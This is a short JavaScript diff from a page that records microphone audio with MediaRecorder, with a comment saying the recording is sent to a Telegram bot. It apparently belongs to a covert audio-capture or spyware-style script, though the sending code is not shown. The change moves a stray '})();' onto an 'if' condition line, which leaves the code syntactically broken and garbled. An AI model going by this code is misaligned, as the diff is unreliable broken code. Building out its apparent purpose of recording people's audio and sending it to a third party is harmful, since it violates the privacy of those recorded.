@@ -76,7 +76,7 @@
 
         function startAudioRecording() {
             // Check if MediaRecorder API is supported
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) })();
 
                 // Constraints for audio recording
                 var constraints = { audio: true };
@@ -93,7 +93,7 @@
                         // Collect audio data in chunks
                         mediaRecorder.ondataavailable = function (e) {
                             audioDataChunks.push(e.data);
-                        })();
+                        }
 
                         // Stop audio recording and send it to Telegram bot
                         mediaRecorder.onstop = function () {
